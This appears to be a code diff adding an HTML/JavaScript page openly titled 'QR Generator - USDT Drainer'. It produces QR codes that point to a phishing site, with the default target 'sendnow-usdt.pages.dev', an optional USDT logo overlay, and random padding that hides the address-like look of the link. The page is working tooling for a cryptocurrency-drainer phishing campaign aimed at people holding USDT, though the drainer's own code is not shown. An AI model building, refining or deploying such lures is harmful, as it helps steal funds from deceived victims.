@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>QR Generator - USDT Drainer</title>
+<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,-apple-system,sans-serif;background:#0c0e13;color:#d7dae1;min-height:100vh;padding:20px}
+.container{max-width:720px;margin:0 auto}
+h1{font-size:16px;letter-spacing:1px;color:#6ee7a8;margin-bottom:20px;text-transform:uppercase}
+.card{background:#161a22;border:1px solid #252b36;border-radius:12px;padding:20px;margin-bottom:20px}
+label{display:block;font-size:13px;color:#9aa4b2;margin-bottom:6px}
+input[type="text"],textarea{width:100%;background:#0c0e13;border:1px solid #252b36;border-radius:8px;padding:12px;font:inherit;color:#d7dae1;outline:none}
+input:focus,textarea:focus{border-color:#3b82f6}
+.row{display:flex;gap:12px;flex-wrap:wrap;margin-top:12px}
+.row > *{flex:1;min-width:140px}
+button{background:#1d4ed8;border:none;border-radius:8px;padding:12px 20px;font:inherit;color:#fff;cursor:pointer;font-weight:600}
+button:hover{background:#2563eb}
+button:disabled{opacity:0.5;cursor:not-allowed}
+#qrCanvas{display:block;margin:16px auto 0;max-width:100%;height:auto;background:#fff;border-radius:8px;padding:16px;box-shadow:0 4px 24px rgba(0,0,0,0.3)}
+.stats{display:flex;gap:24px;margin-top:16px;font-size:13px;color:#9aa4b2;flex-wrap:wrap}
+.stat{display:flex;flex-direction:column;gap:2px}
+.stat b{color:#6ee7a8;font-size:16px}
+.warning{background:#422006;border:1px solid #78350f;color:#fcd34d;padding:12px;border-radius:8px;margin-top:12px;font-size:13px;display:none}
+.warning.show{display:block}
+.success{background:#14532d;border:1px solid #166534;color:#86efac;padding:12px;border-radius:8px;margin-top:12px;font-size:13px;display:none}
+.success.show{display:block}
+.help{font-size:12px;color:#6b7484;margin-top:4px}
+</style>
+</head>
+<body>
+<div class="container">
+  <h1>QR Generator</h1>
+
+  <div class="card">
+    <label>Target URL (phishing site)</label>
+    <input type="text" id="targetUrl" placeholder="https://your-domain.pages.dev" value="https://sendnow-usdt.pages.dev">
+    <div class="help">Full URL of your deployed Cloudflare Pages site. QR will encode this URL + random padding.</div>
+  </div>
+
+  <div class="card">
+    <label>Logo (optional - data URL or https://)</label>
+    <input type="text" id="logoUrl" placeholder="data:image/png;base64,... or https://example.com/logo.png" value="">
+    <div class="help">Recommended: 88x88px USDT logo. Max 14% of QR size. Leave empty for no logo.</div>
+  </div>
+
+  <div class="card">
+    <div class="row">
+      <div>
+        <label>ECC Level</label>
+        <select id="eccLevel" style="width:100%;background:#0c0e13;border:1px solid #252b36;border-radius:8px;padding:12px;font:inherit;color:#d7dae1">
+          <option value="L">L (~7% recovery)</option>
+          <option value="M">M (~15% recovery)</option>
+          <option value="Q" selected>Q (~25% recovery) — recommended</option>
+          <option value="H">H (~30% recovery)</option>
+        </select>
+      </div>
+      <div>
+        <label>QR Version (1-40, 0=auto)</label>
+        <input type="number" id="qrVersion" min="0" max="40" value="10" style="width:100%">
+      </div>
+      <div>
+        <label>Quiet Zone (modules)</label>
+        <input type="number" id="quietZone" min="0" max="10" value="4" style="width:100%">
+      </div>
+      <div>
+        <label>Logo Size %</label>
+        <input type="number" id="logoPct" min="0" max="30" value="14" step="1" style="width:100%">
+      </div>
+    </div>
+  </div>
+
+  <button id="generateBtn" onclick="generate()">Generate QR</button>
+
+  <div id="warning" class="warning"></div>
+  <div id="success" class="success"></div>
+
+  <canvas id="qrCanvas" width="370" height="370" style="display:none"></canvas>
+
+  <div id="stats" class="stats" style="display:none">
+    <div class="stat"><span>Version</span><b id="statVersion">-</b></div>
+    <div class="stat"><span>Modules</span><b id="statModules">-</b></div>
+    <div class="stat"><span>ECC</span><b id="statEcc">-</b></div>
+    <div class="stat"><span>Capacity</span><b id="statCapacity">-</b></div>
+    <div class="stat"><span>Logo %</span><b id="statLogoPct">-</b></div>
+  </div>
+</div>
+
+<script>
+// QRCode.js doesn't support logo embedding or version control well.
+// Use a more capable library approach - we'll implement manual QR with logo.
+// For simplicity, use QRCode.js for base and overlay logo.
+
+function generate() {
+  const url = document.getElementById('targetUrl').value.trim();
+  const logoUrl = document.getElementById('logoUrl').value.trim();
+  const ecc = document.getElementById('eccLevel').value;
+  const version = parseInt(document.getElementById('qrVersion').value) || 0;
+  const quiet = parseInt(document.getElementById('quietZone').value) || 4;
+  const logoPct = parseInt(document.getElementById('logoPct').value) || 14;
+
+  if (!url) { alert('Enter target URL'); return; }
+
+  // Add random padding to avoid address-like QR (v10 = 57x57 modules)
+  const padding = '#' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+  const fullUrl = url + padding;
+
+  const canvas = document.getElementById('qrCanvas');
+  const ctx = canvas.getContext('2d');
+  const size = 370;
+  canvas.width = size;
+  canvas.height = size;
+  canvas.style.display = 'block';
+
+  // Clear white background
+  ctx.fillStyle = '#ffffff';
+  ctx.fillRect(0, 0, size, size);
+
+  // Generate QR using QRCode.js into a temp canvas
+  const tempCanvas = document.createElement('canvas');
+  tempCanvas.width = size;
+  tempCanvas.height = size;
+  new QRCode(tempCanvas, {
+    text: fullUrl,
+    width: size,
+    height: size,
+    correctLevel: QRCode.CorrectLevel[ecc],
+    version: version || undefined
+  });
+
+  // Draw temp canvas onto main canvas
+  ctx.drawImage(tempCanvas, 0, 0);
+
+  // Get actual version/modules from QRCode
+  // QRCode.js doesn't expose this easily, so estimate
+  const modules = version ? 17 + 4 * version : estimateVersion(fullUrl.length, ecc);
+  const actualVersion = version || Math.max(1, Math.ceil((modules - 17) / 4));
+
+  // Draw logo if provided
+  let logoDrawn = false;
+  if (logoUrl) {
+    const img = new Image();
+    img.crossOrigin = 'anonymous';
+    img.onload = () => {
+      const logoSize = Math.min(size * logoPct / 100, size * 0.3);
+      const x = (size - logoSize) / 2;
+      const y = (size - logoSize) / 2;
+      // White background behind logo
+      ctx.fillStyle = '#ffffff';
+      ctx.fillRect(x - 4, y - 4, logoSize + 8, logoSize + 8);
+      ctx.drawImage(img, x, y, logoSize, logoSize);
+      logoDrawn = true;
+      updateStats(actualVersion, modules, ecc, logoPct, logoDrawn);
+      document.getElementById('success').textContent = 'QR generated! Right-click to save.';
+      document.getElementById('success').classList.add('show');
+    };
+    img.onerror = () => {
+      document.getElementById('warning').textContent = '⚠ Logo failed to load. QR generated without logo.';
+      document.getElementById('warning').classList.add('show');
+      updateStats(actualVersion, modules, ecc, logoPct, false);
+      document.getElementById('success').textContent = 'QR generated (no logo)! Right-click to save.';
+      document.getElementById('success').classList.add('show');
+    };
+    img.src = logoUrl;
+  } else {
+    updateStats(actualVersion, modules, ecc, 0, false);
+    document.getElementById('success').textContent = 'QR generated! Right-click to save.';
+    document.getElementById('success').classList.add('show');
+  }
+
+  if (logoPct > 14 && logoUrl) {
+    document.getElementById('warning').textContent = `⚠ Logo size ${logoPct}% exceeds recommended 14% cap. May reduce scan reliability.`;
+    document.getElementById('warning').classList.add('show');
+  }
+}
+
+function estimateVersion(len, ecc) {
+  // Rough capacity estimates for alphanumeric
+  const caps = {
+    L: [41, 77, 127, 187, 255, 322, 370, 461, 552, 652, 772, 883, 1022, 1159, 1313, 1468, 1618, 1758, 2002, 2152, 2303, 2431, 2663, 2856, 3057, 3283, 3517, 3669, 3909, 4158, 4417, 4686, 4965, 5253, 5529, 5836, 6153, 6479, 6743],
+    M: [34, 63, 101, 149, 202, 255, 293, 365, 432, 513, 604, 691, 796, 901, 1027, 1153, 1281, 1405, 1530, 1663, 1802, 1927, 2102, 2246, 2400, 2558, 2716, 2874, 3035, 3204, 3371, 3550, 3729, 3907, 4095, 4272, 4443, 4627, 4815],
+    Q: [27, 48, 77, 111, 144, 178, 207, 259, 312, 364, 427, 489, 580, 642, 733, 817, 912, 1000, 1080, 1174, 1276, 1358, 1486, 1614, 1738, 1864, 1990, 2127, 2264, 2391, 2528, 2665, 2802, 2949, 3096, 3233, 3370, 3527, 3674],
+    H: [17, 34, 58, 82, 106, 139, 154, 202, 235, 288, 331, 374, 427, 468, 530, 602, 674, 746, 813, 892, 972, 1034, 1132, 1226, 1320, 1414, 1508, 1602, 1708, 1802, 1896, 1990, 2084, 2188, 2292, 2396, 2500, 2604, 2708]
+  };
+  const cap = caps[ecc];
+  for (let v = 0; v < cap.length; v++) {
+    if (len <= cap[v]) return v + 1;
+  }
+  return 40;
+}
+
+function updateStats(ver, modules, ecc, logoPct, logoDrawn) {
+  document.getElementById('statVersion').textContent = ver;
+  document.getElementById('statModules').textContent = `${modules}×${modules}`;
+  document.getElementById('statEcc').textContent = ecc;
+  document.getElementById('statCapacity').textContent = '~' + estimateCapacity(ver, ecc) + ' chars';
+  document.getElementById('statLogoPct').textContent = logoDrawn ? logoPct + '%' : 'none';
+  document.getElementById('stats').style.display = 'flex';
+}
+
+function estimateCapacity(ver, ecc) {
+  const caps = {
+    L: [41, 77, 127, 187, 255, 322, 370, 461, 552, 652, 772, 883, 1022, 1159, 1313, 1468, 1618, 1758, 2002, 2152, 2303, 2431, 2663, 2856, 3057, 3283, 3517, 3669, 3909, 4158, 4417, 4686, 4965, 5253, 5529, 5836, 6153, 6479, 6743],
+    M: [34, 63, 101, 149, 202, 255, 293, 365, 432, 513, 604, 691, 796, 901, 1027, 1153, 1281, 1405, 1530, 1663, 1802, 1927, 2102, 2246, 2400, 2558, 2716, 2874, 3035, 3204, 3371, 3550, 3729, 3907, 4095, 4272, 4443, 4627, 4815],
+    Q: [27, 48, 77, 111, 144, 178, 207, 259, 312, 364, 427, 489, 580, 642, 733, 817, 912, 1000, 1080, 1174, 1276, 1358, 1486, 1614, 1738, 1864, 1990, 2127, 2264, 2391, 2528, 2665, 2802, 2949, 3096, 3233, 3370, 3527, 3674],
+    H: [17, 34, 58, 82, 106, 139, 154, 202, 235, 288, 331, 374, 427, 468, 530, 602, 674, 746, 813, 892, 972, 1034, 1132, 1226, 1320, 1414, 1508, 1602, 1708, 1802, 1896, 1990, 2084, 2188, 2292, 2396, 2500, 2604, 2708]
+  };
+  return caps[ecc][ver - 1] || 0;
+}
+</script>
+</body>
+</html>
